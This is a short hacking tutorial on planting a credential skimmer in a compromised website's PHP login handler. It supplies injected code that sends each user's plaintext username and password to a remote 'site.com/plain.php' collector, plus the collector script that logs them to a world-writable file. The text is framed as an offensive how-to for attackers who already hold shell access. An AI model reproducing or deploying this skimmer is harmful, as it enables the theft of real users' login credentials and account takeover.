[+] Login Form Password Stealing - Tutorial
[+] Author: Rohit Bansal

---------------------------------------------------------------------------------------

Intro:
It seems that alot of people these days are gaining shell access,
downloading a database
then attempting to crack the hashes. If they are salted, sha1 or a hard to
crack plain
ole' MD5, they start bitchin and moaning when they can't get the plain text.
So here it
is, a tutorial on how to get user:pass format in plain text of ANY hash
type.

Method:
Modify the login form of a site to catch the password remotely, before it is
encrypted. I
will explain this more simply via an example.

Take the following login form for example,
<form method="post" action="cookies.php"><hr />
<p>User: <input type="text" class="buttonstyle" name="username"></p>
<p>Pass: <input type="password" class="buttonstyle" name="password"></p>
<p><input type="submit" value="Login" class="buttonstyle" name="submit">
<input type="reset" value="Reset" class="buttonstyle" /></p>
</form>

Now we can see that the action of this form points to 'cookies.php'. Now
cookies.php
will probably include a function similar to this depending on the encryption
type, etc.
$user = $_POST['username'];
$pass = $_POST['password'];
if(md5($user) == $usermd5 && md5($pass) == $passmd5){
setcookie("Whatever", $cookie, time()+3600, "/");
header("Location: index.php");
die();
}

Now on to bypassing the encryption before it happens, thus gaining the
username and
password in plain text we need to edit the 'cookie.php' site, add the
following code at
the start of the php tags.
<?php
$user = $_POST['username'];
$pass = $_POST['password'];
file_get_contents("http://site.com/plain.php?user=
".$user."&pass=".$pass."");
?>

Now the php file 'plain.php' will include the following code:
<?php
$user = $_GET['user'];
$pass = $_GET['pass'];
$file = "lol.txt";
$fp = fopen($file, "a");
fputs($fp, "$user:$pass\n");
fclose($fp);
?>

Notice you will also need to upload a file 'lol.txt', and chmod it to 777.

Conclusion:
Now everytime a user logs into the site you are editing the code of, it will
send the
username and password to the 'plain.php' text file and save it in 'log.txt',
on a remote
server in theformat of:
user:pass
